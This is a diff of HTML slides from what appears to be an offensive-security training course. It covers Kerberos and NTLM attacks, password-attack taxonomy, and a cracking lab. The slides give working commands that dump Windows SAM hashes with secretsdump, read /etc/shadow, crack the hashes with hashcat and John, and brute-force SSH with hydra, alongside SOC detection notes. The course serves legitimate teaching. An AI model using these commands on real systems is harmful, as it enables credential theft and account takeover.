+          <text class="d-sub" x="825" y="82" text-anchor="middle">knows the hash too</text>
+          <!-- lifelines -->
+          <line x1="115" y1="92" x2="115" y2="250" stroke="#333b4c" stroke-width="1.2"/>
+          <line x1="825" y1="92" x2="825" y2="250" stroke="#333b4c" stroke-width="1.2"/>
+          <!-- messages -->
+          <path class="flow-line" d="M118,120 L822,120" fill="none" stroke="#a0aab6" stroke-width="1.8" marker-end="url(#ar-g)"/>
+          <text class="d-lbl d-mono" x="470" y="113" text-anchor="middle" font-size="11">1 · NEGOTIATE  “I want to authenticate”</text>
+          <path class="flow-line" d="M822,158 L118,158" fill="none" stroke="#4ade80" stroke-width="1.8" marker-end="url(#ar-grn)"/>
+          <text class="d-lbl d-mono" x="470" y="151" text-anchor="middle" font-size="11">2 · CHALLENGE  (a random nonce)</text>
+          <path class="flow-line" d="M118,196 L822,196" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"/>
+          <text class="d-lbl d-mono" x="470" y="189" text-anchor="middle" font-size="11" fill="#ff7043">3 · RESPONSE = f(NT hash, challenge)  ← this is NetNTLMv2</text>
+          <!-- key annotation -->
+          <rect x="250" y="216" width="440" height="30" rx="6" fill="#0d1218" stroke="#ff7043"/>
+          <text class="d-mono" x="470" y="235" text-anchor="middle" font-size="11" fill="#ff7043">the NT hash itself NEVER crosses the wire — only this keyed response does</text>
+          <!-- attacker inserts -->
+          <rect x="360" y="272" width="220" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-title" x="470" y="293" text-anchor="middle" font-size="12" fill="#ff7043">Attacker (Responder)</text>
+          <text class="d-sub" x="470" y="310" text-anchor="middle">answers the client's name lookup → receives step 3</text>
+          <path class="flow-line" d="M300,200 C320,240 380,262 430,270" fill="none" stroke="#ff7043" stroke-width="1.6" stroke-dasharray="4 4" marker-end="url(#ar-o)"/>
+        </svg>
+        <button type="button" class="dgm-replay" data-replay>↻ Replay the exchange</button>
+        <figcaption><b>Responder captures the response, not the hash.</b> What you crack (mode <span class="mono">5600</span>)
+           is the <span class="mono">NetNTLMv2</span> keyed response — recover the password offline and you have the account.
+           The NT hash never left the client.</figcaption>
+      </figure>
+
+      <div class="box key-takeaway">
+        <span class="box-t">The distinction that trips everyone</span>
+        <p><strong>NetNTLMv2</strong> (what crosses the wire, what Responder grabs, hashcat mode 5600) is <em>not</em> the
+           <strong>NT hash</strong> (what sits in the SAM, hashcat mode 1000). Same account, different artefacts, cracked
+           differently. Confuse them and you'll pick the wrong hashcat mode and waste an hour.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P12 · KERBEROS (ANIMATED)  ========== -->
+  <section class="page" data-title="Kerberos ticket flow">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P12</span><span class="tag theory">Method · animated</span><span class="time">⏱ 10 min</span></div>
+      <h1>Kerberos, and Its Two Bleed Points</h1>
+      <p class="lede">The modern Windows protocol is ticket-based — and it leaks in exactly two places, which are two
+         of today's attacks.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why NTLM wasn't enough to know</span>
+        <p>Active Directory prefers <strong>Kerberos</strong>. It's more secure than NTLM by design — but "more secure"
+           isn't "no attack surface." Two specific messages in the flow can be requested by any user and cracked offline.
+           Learn the flow and AS-REP roasting and Kerberoasting stop being magic.</p>
+      </div>
+
+      <h2>The ticket flow — press play</h2>
+      <p>Kerberos uses a trusted third party, the <strong>KDC</strong> (Key Distribution Center, running on the DC), and
+         tickets instead of passwords. Three exchanges:</p>
+
+      <figure class="dgm animate-run">
+        <svg viewBox="0 0 940 350" role="img" aria-label="Kerberos flow: AS-REQ and AS-REP grant a ticket-granting ticket, TGS-REQ and TGS-REP grant a service ticket, then the client presents the service ticket to the service. AS-REP roasting attacks the AS-REP; Kerberoasting attacks the TGS-REP.">
+          <!-- actors -->
+          <rect x="40" y="150" width="140" height="56" rx="8" fill="#1f2533" stroke="#22d3ee"/>
+          <text class="d-title" x="110" y="174" text-anchor="middle" font-size="12.5">Client / user</text>
+          <text class="d-sub" x="110" y="192" text-anchor="middle">any domain user</text>
+          <rect x="760" y="60" width="150" height="60" rx="8" fill="#1f2533" stroke="#4ade80"/>
+          <text class="d-title" x="835" y="84" text-anchor="middle" font-size="12" fill="#4ade80">KDC (on the DC)</text>
+          <text class="d-sub" x="835" y="102" text-anchor="middle">AS + TGS</text>
+          <rect x="760" y="250" width="150" height="56" rx="8" fill="#1f2533" stroke="#768290"/>
+          <text class="d-title" x="835" y="274" text-anchor="middle" font-size="12">Service</text>
+          <text class="d-sub" x="835" y="292" text-anchor="middle">e.g. MSSQL (an SPN)</text>
+          <!-- AS exchange -->
+          <path class="flow-line" d="M182,158 L758,96" fill="none" stroke="#a0aab6" stroke-width="1.7" marker-end="url(#ar-g)"/>
+          <text class="d-lbl d-mono" x="360" y="120" font-size="11">1 · AS-REQ</text>
+          <path class="flow-line" d="M758,110 L182,172" fill="none" stroke="#4ade80" stroke-width="1.7" marker-end="url(#ar-grn)"/>
+          <text class="d-lbl d-mono" x="470" y="150" font-size="11" fill="#4ade80">2 · AS-REP → TGT</text>
+          <!-- TGS exchange -->
+          <path class="flow-line" d="M182,188 L758,240" fill="none" stroke="#a0aab6" stroke-width="1.7" marker-end="url(#ar-g)"/>
+          <text class="d-lbl d-mono" x="330" y="214" font-size="11">3 · TGS-REQ (present TGT, name an SPN)</text>
+          <path class="flow-line" d="M758,262 L182,200" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"/>
+          <text class="d-lbl d-mono" x="470" y="238" font-size="11" fill="#ff7043">4 · TGS-REP → service ticket</text>
+          <!-- present to service -->
+          <path class="flow-line" d="M150,206 C150,300 500,320 758,290" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <text class="d-lbl d-mono" x="360" y="332" font-size="11">5 · present service ticket → access</text>
+          <!-- bleed point badges -->
+          <rect x="470" y="44" width="250" height="26" rx="6" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-mono" x="595" y="62" text-anchor="middle" font-size="10.5" fill="#ff7043">BLEED 1 · AS-REP roast (no pre-auth)</text>
+          <rect x="250" y="250" width="250" height="26" rx="6" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-mono" x="375" y="268" text-anchor="middle" font-size="10.5" fill="#ff7043">BLEED 2 · Kerberoast (any user)</text>
+        </svg>
+        <button type="button" class="dgm-replay" data-replay>↻ Replay the ticket flow</button>
+        <figcaption><b>Two messages leak crackable material.</b> The AS-REP (step 2) is encrypted with the <em>user's</em>
+           hash; the TGS-REP service ticket (step 4) is encrypted with the <em>service account's</em> hash. Request either,
+           take it offline, and crack.</figcaption>
+      </figure>
+
+      <div class="split">
+        <div class="box attacker-view">
+          <span class="box-t">Bleed 1 · AS-REP roasting (T1558.004)</span>
+          <p>If an account has <strong>"Do not require Kerberos pre-authentication"</strong> set, anyone can ask for its
+             AS-REP <em>without proving who they are</em>. The AS-REP is encrypted with that user's password hash →
+             crack it offline (hashcat <span class="mono">-m 18200</span>). No credentials needed to <em>request</em> it.
+             Tool: <span class="mono">GetNPUsers</span>.</p>
+        </div>
+        <div class="box attacker-view">
+          <span class="box-t">Bleed 2 · Kerberoasting (T1558.003)</span>
+          <p><strong>Any authenticated user</strong> can request a service ticket for <em>any</em> SPN. That ticket is
+             encrypted with the <strong>service account's</strong> password hash → crack it offline (hashcat
+             <span class="mono">-m 13100</span>). Service accounts often have old, weak passwords, which is why this
+             works. Tool: <span class="mono">GetUserSPNs</span>. This is Lab 6.</p>
+        </div>
+      </div>
+
+      <div class="box defender-view">
+        <span class="box-t">SOC flip — both are loud at the KDC</span>
+        <p>Every ticket request hits the DC and is logged: <span class="mono">4768</span> (TGT requested, AS-REP),
+           <span class="mono">4769</span> (service ticket requested, TGS-REP). A burst of <span class="mono">4769</span>
+           for many SPNs from one account — especially with <strong>encryption type <span class="mono">0x17</span>
+           (RC4)</strong> — is the Kerberoast signature. You'll key a rule on exactly this in Lab 7.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P13 · TAXONOMY + PIPELINE  ========== -->
+  <section class="page" data-title="Password-attack taxonomy">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P13</span><span class="tag theory">Method · the whole map</span><span class="time">⏱ 9 min</span></div>
+      <h1>Every Password Attack on One Map</h1>
+      <p class="lede">The first split decides everything: are you attacking the login (online) or a stolen hash
+         (offline)? They have opposite constraints.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why the map before the tools</span>
+        <p>hashcat, hydra, netexec, Responder, Impacket — each is just one branch of this map. See the whole thing once
+           and every tool has an obvious place, and you'll pick the right attack for the situation instead of reaching
+           for the one tool you remember.</p>
+      </div>
+
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 300" role="img" aria-label="Password attacks split into online attacks against a live login and offline attacks against a stolen hash; a separate branch, pass-the-hash, skips cracking entirely.">
+          <rect x="386" y="16" width="168" height="44" rx="9" fill="#1f2533" stroke="#e63946"/>
+          <text class="d-title" x="470" y="43" text-anchor="middle" font-size="13">Password attacks</text>
+          <!-- ONLINE -->
+          <g class="node" data-node="online" tabindex="0">
+            <rect x="70" y="96" width="170" height="44" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-title" x="155" y="123" text-anchor="middle" font-size="12.5" fill="#ff7043">ONLINE — the login</text>
+          </g>
+          <g class="node" data-node="spray" tabindex="0">
+            <rect x="30" y="176" width="118" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
+            <text class="d-lbl" x="89" y="201" text-anchor="middle" font-size="11.5">Spraying</text>
+          </g>
+          <rect x="158" y="176" width="118" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
+          <text class="d-lbl" x="217" y="201" text-anchor="middle" font-size="11.5">Brute-force</text>
+          <g class="node" data-node="credstuff" tabindex="0">
+            <rect x="70" y="228" width="170" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
+            <text class="d-lbl" x="155" y="253" text-anchor="middle" font-size="11.5">Credential stuffing</text>
+          </g>
+          <!-- OFFLINE -->
+          <g class="node" data-node="offline" tabindex="0">
+            <rect x="470" y="96" width="180" height="44" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-title" x="560" y="123" text-anchor="middle" font-size="12.5" fill="#ff7043">OFFLINE — a stolen hash</text>
+          </g>
+          <rect x="410" y="176" width="104" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
+          <text class="d-lbl" x="462" y="201" text-anchor="middle" font-size="11.5">Dictionary</text>
+          <g class="node" data-node="rules" tabindex="0">
+            <rect x="522" y="176" width="104" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
+            <text class="d-lbl" x="574" y="201" text-anchor="middle" font-size="11.5">Rule-based</text>
+          </g>
+          <g class="node" data-node="mask" tabindex="0">
+            <rect x="634" y="176" width="90" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
+            <text class="d-lbl" x="679" y="201" text-anchor="middle" font-size="11.5">Mask</text>
+          </g>
+          <rect x="466" y="228" width="120" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
+          <text class="d-lbl" x="526" y="253" text-anchor="middle" font-size="11.5">Hybrid / rainbow</text>
+          <!-- PTH -->
+          <g class="node" data-node="pth" tabindex="0">
+            <rect x="762" y="150" width="160" height="60" rx="9" fill="#1a1f2a" stroke="#a78bfa"/>
+            <text class="d-title" x="842" y="175" text-anchor="middle" font-size="12" fill="#a78bfa">Pass-the-hash</text>
+            <text class="d-sub" x="842" y="194" text-anchor="middle">skip cracking entirely</text>
+          </g>
+          <!-- connectors -->
+          <path d="M420,60 C300,74 210,80 155,94" fill="none" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
+          <path d="M520,60 C580,74 570,82 560,94" fill="none" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
+          <path d="M120,140 L95,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M170,140 L210,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M150,140 L150,226" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M520,140 L470,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M560,140 L574,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M600,140 L672,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M554,44 C660,60 800,90 842,148" fill="none" stroke="#a78bfa" stroke-width="1.3" stroke-dasharray="4 4" marker-end="url(#ar-pu)"/>
+        </svg>
+        <div class="dgm-hint">Click a node — when to use it, and its one constraint.</div>
+        <div class="dgm-detail" data-detail="online"><h5><span class="dd-tag">ONLINE</span>Attacking the live login</h5><p><b>You send guesses at a running service</b> (SMB, RDP, SSH, a web form). Slow, and <em>noisy</em> — every attempt is logged, and a <strong>lockout policy</strong> will lock the account after N tries. Rate-limited and detectable. Tools: hydra, medusa, netexec.</p></div>
+        <div class="dgm-detail" data-detail="spray"><h5><span class="dd-tag">ONLINE</span>Password spraying</h5><p><b>One password, tried against many accounts.</b> The inversion of brute-force: instead of many passwords vs one account (which trips lockout), try <span class="mono">Autumn2025!</span> against everyone — one attempt each stays under the threshold. The single most effective real-world domain attack. Lab 4.</p></div>
+        <div class="dgm-detail" data-detail="credstuff"><h5><span class="dd-tag">ONLINE</span>Credential stuffing</h5><p><b>Reusing username+password pairs from a breach dump</b> against a target, betting on password reuse. Not "guessing" — replaying known-good credentials. Defeated only by unique passwords + MFA.</p></div>
+        <div class="dgm-detail" data-detail="offline"><h5><span class="dd-tag">OFFLINE</span>Attacking a stolen hash</h5><p><b>You already have the hash</b> (from SAM, NTDS, a capture, a roast). Now there's <em>no</em> lockout, <em>no</em> rate limit, <em>no</em> log on the target — you can try billions of guesses on your own GPU. This is where hashcat and John live, and why stealing a hash is the game-changer.</p></div>
+        <div class="dgm-detail" data-detail="rules"><h5><span class="dd-tag">OFFLINE</span>Rule-based</h5><p><b>Mutate a wordlist with rules</b> — capitalise, append <span class="mono">123</span>, swap <span class="mono">a→@</span>. <span class="mono">rockyou + best64.rule</span> turns 14M words into billions of realistic human passwords, cheaply. The highest-yield offline technique against human-chosen passwords.</p></div>
+        <div class="dgm-detail" data-detail="mask"><h5><span class="dd-tag">OFFLINE</span>Mask attack</h5><p><b>Brute-force with a known pattern.</b> If you know the policy is "8 chars, ends in a digit," a mask like <span class="mono">?u?l?l?l?l?l?l?d</span> searches only that space instead of everything — brute-force made tractable by structure.</p></div>
+        <div class="dgm-detail" data-detail="pth"><h5><span class="dd-tag">SHORTCUT</span>Pass-the-hash (T1550.002)</h5><p><b>You don't always need the plaintext.</b> NTLM authenticates <em>with the hash</em> — so an NT hash <em>is</em> the credential. Feed it straight to <span class="mono">nxc ... -H &lt;hash&gt;</span> or <span class="mono">psexec</span> and authenticate without ever cracking. The whole reason a strong password doesn't save a machine once its hash leaks. Lab 6.</p></div>
+      </figure>
+
+      <h2>The hash-cracking pipeline</h2>
+      <p>Every offline crack is the same four steps. Get any one wrong (usually the mode) and it silently fails.</p>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 130" role="img" aria-label="Hash-cracking pipeline: obtain the hash, identify its type and hashcat mode, apply a wordlist plus rules or a mask, and recover the plaintext. Click each step.">
+          <g class="node" data-node="p1" tabindex="0"><rect x="12" y="40" width="180" height="50" rx="8" fill="#1f2533" stroke="#ff7043"/><text class="d-title" x="102" y="62" text-anchor="middle" font-size="12">1 · The hash</text><text class="d-sub" x="102" y="79" text-anchor="middle">SAM / NTDS / capture</text></g>
+          <g class="node" data-node="p2" tabindex="0"><rect x="248" y="40" width="180" height="50" rx="8" fill="#1a1f2a" stroke="#fbbf24"/><text class="d-title" x="338" y="62" text-anchor="middle" font-size="12">2 · Identify + mode</text><text class="d-sub" x="338" y="79" text-anchor="middle">hashid → -m ????</text></g>
+          <g class="node" data-node="p3" tabindex="0"><rect x="484" y="40" width="190" height="50" rx="8" fill="#1a1f2a" stroke="#22d3ee"/><text class="d-title" x="579" y="62" text-anchor="middle" font-size="12">3 · Wordlist + rules/mask</text><text class="d-sub" x="579" y="79" text-anchor="middle">rockyou + best64</text></g>
+          <g class="node" data-node="p4" tabindex="0"><rect x="730" y="40" width="196" height="50" rx="8" fill="#1f2533" stroke="#4ade80"/><text class="d-title" x="828" y="62" text-anchor="middle" font-size="12" fill="#4ade80">4 · Plaintext</text><text class="d-sub" x="828" y="79" text-anchor="middle">the credential</text></g>
+          <path d="M192,65 L246,65" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M428,65 L482,65" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M674,65 L728,65" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each step — and note where students actually fail.</div>
+        <div class="dgm-detail" data-detail="p1"><h5><span class="dd-tag">STEP 1</span>Get the hash</h5><p><b>From the SAM (local), NTDS.dit (domain), a Responder capture, or a roasted ticket.</b> The format you get decides the mode — a captured NetNTLMv2 looks nothing like a SAM NT hash. Keep the whole line; some formats need the username and salt too.</p></div>
+        <div class="dgm-detail" data-detail="p2"><h5><span class="dd-tag">STEP 2 · where it fails</span>Identify + pick the mode</h5><p><b>The same hash string with the wrong <span class="mono">-m</span> never matches.</b> NT hash = 1000, NetNTLMv2 = 5600, Kerberoast = 13100, AS-REP = 18200. Use <span class="mono">hashid</span> or the artefact's shape to choose. This is the single most common mistake in the room.</p></div>
+        <div class="dgm-detail" data-detail="p3"><h5><span class="dd-tag">STEP 3</span>Wordlist + rules/mask</h5><p><b>Cheap guesses first.</b> rockyou alone, then <span class="mono">+ best64.rule</span> (mutations), then a mask if you know the pattern. This ordering is why a real crack takes seconds, not days — you exhaust the likely space before the brute space.</p></div>
+        <div class="dgm-detail" data-detail="p4"><h5><span class="dd-tag">STEP 4</span>Plaintext</h5><p><b>A working credential.</b> <span class="mono">--show</span> prints <span class="mono">hash:plaintext</span>. <span class="mono">Exhausted</span> means the wordlist ran out — not "uncrackable"; escalate rules → mask before you give up.</p></div>
+      </figure>
+    </div>
+  </section>
+
+  <!-- ==========  P14 · BREAK  ========== -->
+  <section class="page" data-title="Break">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P14</span><span class="tag activity">Break</span><span class="time">⏱ 10 min</span></div>
+      <h1>Break</h1>
+      <p class="lede">Halfway. The mechanism is done — the rest of the session is at the keyboard, cracking and capturing
+         real credentials against the domain.</p>
+    </div>
+    <div class="content">
+      <div class="timer-card" data-timer="10">
+        <div class="timer-ring">
+          <svg viewBox="0 0 120 120"><circle class="timer-ring-bg" cx="60" cy="60" r="54"/><circle class="timer-ring-fill" cx="60" cy="60" r="54"/></svg>
+          <div class="timer-display">10:00</div>
+        </div>
+        <h3>Stretch, then back to it</h3>
+        <p class="timer-note">Press start when the break begins.</p>
+        <div class="timer-btns">
+          <button class="btn primary" data-act="start">▶ Start break</button>
+          <button class="btn" data-act="reset">↺ Reset</button>
+        </div>
+      </div>
+      <div class="box tip">
+        <span class="box-t">When you're back</span>
+        <p>Four labs left, each generating real evidence: SAM/shadow hashes you crack, a 4625 spray spike, a captured
+           NetNTLMv2, and a 4769 Kerberoast. You'll read all of it as a defender at the end and write the rule that
+           catches it. Keep every output file — Lab 7 needs them.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P15 · HASHCAT + JOHN  ========== -->
+  <section class="page" data-title="hashcat &amp; john">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P15</span><span class="tag theory">Tool group · offline cracking</span><span class="time">⏱ 8 min</span></div>
+      <h1>hashcat &amp; John — the Offline Crackers</h1>
+      <p class="lede">Two tools, one job: guess billions of candidates against a stolen hash, on your hardware, with no
+         one watching.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why these two together</span>
+        <p>Both crack hashes offline; they differ in strengths. <strong>hashcat</strong> is GPU-accelerated and
+           mode-driven — fastest, and what you'll use for every Windows/Kerberos hash today. <strong>John the Ripper</strong>
+           (the "jumbo" build) is CPU-friendly, auto-detects many formats, and ships handy <span class="mono">*2john</span>
+           helpers. Learn the method once; it's identical.</p>
+      </div>
+
+      <h2 class="mono" style="color:#ff7043">hashcat — the 7-part frame</h2>
+      <div class="tbl-scroll">
+      <table>
+        <tbody>
+          <tr><td style="width:150px"><strong>What it is</strong></td><td>A GPU-accelerated offline password recovery tool. Mode-driven: <span class="mono">-m</span> selects the hash type.</td></tr>
+          <tr><td><strong>Why it exists</strong></td><td>Because a stolen hash has no lockout and no rate limit — the only limits are your hardware and your wordlist. hashcat maxes both.</td></tr>
+          <tr><td><strong>The method</strong></td><td>Identify the hash → pick the exact <span class="mono">-m</span> mode → start with a wordlist → add rules → escalate to a mask. Fast, cheap guesses first; expensive brute-force last.</td></tr>
+          <tr><td><strong>Real syntax</strong></td><td><pre><code>hashcat -m 1000  sam.txt   rockyou.txt                    # NT hash (SAM)
+hashcat -m 5600  netntlm.txt rockyou.txt -r best64.rule   # captured NetNTLMv2
+hashcat -m 13100 spn.txt   rockyou.txt -r best64.rule     # Kerberoast ticket
+hashcat -m 18200 asrep.txt rockyou.txt                    # AS-REP roast
+hashcat -m 1000  sam.txt --show                           # print cracked results</code></pre></td></tr>
+          <tr><td><strong>Read the output</strong></td><td>Each cracked line prints <span class="mono">hash:plaintext</span>. <span class="mono">Status: Cracked</span> = done; <span class="mono">Exhausted</span> = the wordlist ran out without a match (not "uncrackable" — try rules or a bigger list).</td></tr>
+          <tr><td><strong>What it feeds</strong></td><td>The "credentials obtained + how" column of the access plan.</td></tr>
+          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">None on the target.</span> Offline cracking happens on <em>your</em> box — the victim never sees it. The detectable event was <em>earlier</em>: how you got the hash (a SAM dump, a Kerberoast 4769, a Responder capture). That's the lesson — you detect the theft, never the crack.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>The modes you need today — memorise these four</h2>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th><span class="mono">-m</span></th><th>Hash</th><th>Where it came from</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">1000</td><td>NTLM (NT hash)</td><td>SAM dump, NTDS.dit — Lab 3, Lab 6</td></tr>
+          <tr><td class="mono">5600</td><td>NetNTLMv2</td><td>Responder capture — Lab 5</td></tr>
+          <tr><td class="mono">13100</td><td>Kerberos 5 TGS-REP (RC4)</td><td>Kerberoast (GetUserSPNs) — Lab 6</td></tr>
+          <tr><td class="mono">18200</td><td>Kerberos 5 AS-REP (RC4)</td><td>AS-REP roast (GetNPUsers) — Lab 6</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2 class="mono" style="color:#ff7043">John the Ripper (jumbo) — the same job, CPU-first</h2>
+      <pre><code>unshadow passwd.txt shadow.txt > unshadowed.txt     # merge /etc/passwd + /etc/shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+john --show unshadowed.txt                           # print cracked
+
+# the *2john helpers turn artefacts into John/hashcat input:
+#   zip2john, ssh2john, keepass2john, kirbi2john ...</code></pre>
+
+      <div class="box tip">
+        <span class="box-t">rockyou ships gzipped on current Kali</span>
+        <p><span class="mono">sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz</span> once (the <span class="mono">-k</span>
+           keeps the archive). It's the single most useful wordlist you own — ~14M real leaked passwords. Pair it with
+           <span class="mono">best64.rule</span> and you cover the overwhelming majority of human-chosen passwords.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P16 · LAB 3 — CRACK SAM + SHADOW  ========== -->
+  <section class="page" data-title="Lab 3: crack the hashes">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P16</span><span class="tag lab">Hands-on · everyone</span><span class="time">⏱ 15 min</span></div>
+      <h1>Lab 3 — Crack Local Hashes, Both OSes</h1>
+      <p class="lede">Windows SAM hashes with hashcat, Linux <span class="mono">/etc/shadow</span> with John — the same
+         pipeline, two credential stores.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">What you are about to do</span>
+        <p>Turn stolen hashes into plaintext credentials. You'll dump the local SAM from a Windows box (needs a local
+           admin credential you have), crack the NT hashes, then crack Metasploitable2's <span class="mono">/etc/shadow</span>.
+           Both feed the access plan. This is <strong>offline</strong> — the targets see nothing once you have the hash.</p>
+      </div>
+
+      <h2>Step 1 — dump and crack the Windows SAM (Win7 / Win10)</h2>
+      <ol class="steps">
+        <li>
+          <strong>Dump the local SAM</strong> with secretsdump (uses a local admin credential).
+          <pre><code>impacket-secretsdump ./Administrator@192.168.56.107   # Win7; prompts for the password
+# output — NT hashes for the seeded local accounts:
+# labuser:1001:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# helpdesk:1002:aad3b...:&lt;nt-hash&gt;:::
+# take the 4th field (the NT hash) into a file, one per line
+awk -F: 'NF>3{print $4}' sam_dump.txt > sam.txt</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li><span class="mono">secretsdump</span> printed <span class="mono">user:rid:LM:NT:::</span> lines for your seeded local accounts</li>
+              <li><span class="mono">sam.txt</span> holds the NT hashes, one per line</li>
+            </ul>
+          </div>
+        </li>
+        <li>
+          <strong>Crack them</strong> — NT hash is mode 1000.
+          <pre><code>hashcat -m 1000 sam.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 1000 sam.txt --show      # → labuser:Summer2024 , helpdesk:Password1 ...</code></pre>
+          <figure class="shot">
+            <img src="assets/img/hashcat-crack.jpg" alt="hashcat finishing a mode 1000 NT-hash crack, showing Status: Cracked and recovered plaintext passwords">
+            <figcaption>A real hashcat mode-1000 run finishing — <span class="mono">Status: Cracked</span>, <span class="mono">Recovered 4/4</span>, and the plaintext. <em>(Genuine hashcat run; the accounts and passwords are lab-only throwaways.)</em></figcaption>
+          </figure>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>At least the weak seeded accounts crack; <span class="mono">--show</span> prints <span class="mono">hash:plaintext</span></li>
+              <li>You recorded each recovered <strong>credential</strong> for the access plan</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 2 — crack Linux <span class="mono">/etc/shadow</span> (Metasploitable2)</h2>
+      <ol class="steps">
+        <li>
+          <strong>Merge and crack with John.</strong>
+          <pre><code># from a shell on Metasploitable2 (or copies you already have):
+unshadow /etc/passwd /etc/shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+john --show unshadowed.txt          # → msfadmin:msfadmin , user:user ...</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>John cracks the weak accounts; <span class="mono">--show</span> lists <span class="mono">user:password</span></li>
+              <li>You can explain why these fell instantly (they're in rockyou) — cracking is guessing at scale</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 3 — the deliberate failure: the wrong wordlist</h2>
+      <div class="box warn">
+        <span class="box-t">"Exhausted" is not "uncrackable"</span>
+        <p>Run <span class="mono">hashcat -m 1000 sam.txt rockyou.txt</span> with <em>no</em> rules against a slightly
+           mangled password (e.g. <span class="mono">Summer2024!</span> when rockyou has <span class="mono">summer2024</span>).
+           It reports <span class="mono">Exhausted</span> — a miss. Add <span class="mono">-r best64.rule</span> and it
+           cracks. <b>The lesson:</b> a failed crack usually means <em>wrong wordlist or no rules</em>, not a strong
+           password. Escalate wordlist → rules → mask before you conclude "uncrackable."</p>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">What you produced</span>
+        <p>Real plaintext credentials from two credential stores, and a felt understanding of why weak passwords are the
+           whole game. Every recovered credential is a line in the access plan — and, next session, a login.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P17 · HYDRA + NETEXEC  ========== -->
+  <section class="page" data-title="hydra &amp; netexec">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P17</span><span class="tag theory">Tool group · online attacks</span><span class="time">⏱ 8 min</span></div>
+      <h1>Online Attacks — and Why Spraying Wins</h1>
+      <p class="lede">Attacking a live login is slow and loud. The trick that makes it work at all is inverting the
+         loop: one password, many accounts.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why online is a different game from offline</span>
+        <p>Offline (Lab 3) had no limits. Online has two brutal ones: a <strong>lockout policy</strong> and a
+           <strong>log entry per attempt</strong>. Every online tool lives under those constraints, and spraying is the
+           technique built specifically to slip between them.</p>
+      </div>
+
+      <h2 class="mono" style="color:#ff7043">hydra — the 7-part frame</h2>
+      <div class="tbl-scroll">
+      <table>
+        <tbody>
+          <tr><td style="width:150px"><strong>What it is</strong></td><td>A fast online brute-forcer that speaks many protocols (SSH, FTP, RDP, SMB, HTTP forms…).</td></tr>
+          <tr><td><strong>Why it exists</strong></td><td>To test a live service's credentials at speed — where you can't get the hash, you attack the login directly.</td></tr>
+          <tr><td><strong>The method</strong></td><td>Name the service and target, give it a user (or list) and a wordlist, and mind the lockout — a wide brute-force will lock accounts. Prefer known-user + small list, or spray instead.</td></tr>
+          <tr><td><strong>Real syntax</strong></td><td><pre><code>hydra -l msfadmin -P rockyou.txt 192.168.56.102 ssh
